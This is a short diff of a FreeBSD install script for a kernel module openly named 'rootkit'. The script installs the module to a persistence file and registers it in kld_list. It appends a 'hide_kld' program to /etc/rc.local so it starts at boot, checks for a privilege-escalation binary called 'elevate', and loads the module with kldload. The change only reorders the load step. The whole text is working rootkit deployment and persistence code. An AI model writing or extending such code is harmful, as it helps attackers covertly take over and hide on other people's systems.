@@ -68,16 +68,6 @@ install -m 555 "$MODULE_FILE" "$PERSISTENCE_FILE"
 # Add rootkit to kld_list without duplicating existing entries
 sysrc kld_list+=rootkit >/dev/null
 
-
-# Load it during the current boot
-if [ "$MODULE_LOADED" = false ]; then
-    kldload "$PERSISTENCE_FILE"
-
-    if ! kldstat -q -m rootkit >/dev/null 2>&1 && [ ! -c /dev/rootkit ]; then
-        exit 1
-    fi
-fi
-
 # Verify elevate was built successfully
 [ -f "$ELEVATE_BIN" ]
 [ -x "$ELEVATE_BIN" ]
@@ -143,10 +133,18 @@ if [ ! -f /etc/rc.local ]; then
 fi
 chmod +x /etc/rc.local
 
-
 # Ensures no duplicate entries in rc.local
 if ! grep -q "hide_kld" /etc/rc.local; then
     echo "$ABS_PATH &" >> /etc/rc.local
+fi
+
+# Load it during the current boot
+if [ "$MODULE_LOADED" = false ]; then
+    kldload "$PERSISTENCE_FILE"
+
+    if ! kldstat -q -m rootkit >/dev/null 2>&1 && [ ! -c /dev/rootkit ]; then
+        exit 1
+    fi
 fi
 
 "$ABS_PATH" &
